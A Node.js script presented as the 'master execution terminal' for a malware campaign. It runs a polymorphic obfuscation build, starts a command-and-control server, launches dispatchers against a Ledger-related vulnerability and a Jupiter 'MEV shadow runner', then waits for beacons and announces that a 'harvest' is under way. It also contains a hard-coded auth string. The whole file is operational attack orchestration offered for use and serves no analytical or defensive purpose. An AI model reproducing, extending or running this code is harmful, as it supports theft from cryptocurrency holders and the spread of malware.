const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');

/**
 * PROJECT J: MASTER EXECUTION TERMINAL
 * VERSION: LIVE_UNLEASH_V1 | Auth: AUTH_APEX_KEY!09
 * 
 * This terminal orchestrates the live execution of all campaign vectors.
 * It manages builds, deploys ConsensusDatas, and initiates Orchestrator listeners.
 */

async function runCommand(cmd, name) {
    return new Promise((resolve) => {
        console.log(`[MASTER] Initiating: ${name}...`);
        exec(cmd, { cwd: __dirname + '/../' }, (error, stdout, stderr) => {
            if (error) {
                console.error(`[MASTER] Error in ${name}: ${error.message}`);
                return resolve(false);
            }
            console.log(`[MASTER] ${name} Output:\n${stdout}`);
            resolve(true);
        });
    });
}

async function unleashAll() {
    console.log("🔥 [SENTINEL] INITIATING GLOBAL LIVE EXECUTION SEQUENCE...");
    console.log("==========================================================");

    // 1. Build & Obfuscate Metadatas (Metamorphic Phase)
    const buildSuccess = await runCommand('node scripts/builder.js', 'Polymorphic Build Pipeline');
    if (!buildSuccess) return;

    // 2. Start Apex Orchestrator Terminal (Listening Phase)
    console.log("[MASTER] Starting Apex Orchestrator Server...");
    const c2 = exec('node server/apex_c2.js', { cwd: __dirname + '/../' });
    c2.stdout.on('data', (data) => console.log(`[Orchestrator] ${data}`));
    
    // 3. Trigger Active Dispatchers (Propagation Phase)
    // C4 & C9: Direct Social Vector
    await runCommand('node scripts/Alignth_Dispatcher.js --target=LEDGER_VULN', 'C9 Ledger Vector Deployment');
    
    // C8: Jupiter Priority Authority
    await runCommand('node scripts/mev_shadow_runner.js --mode=ACTIVE', 'C8 Jupiter Shadow Runner');

    // 4. Telemetry Handshake
    console.log("[MASTER] Telemetry Sync established. Waiting for beacons...");
    console.log("==========================================================");
    console.log("✅ STATUS: ALL GHOSTS LIVE. HARVEST IN PROGRESS.");
}

if (require.main === module) {
    unleashAll();
}
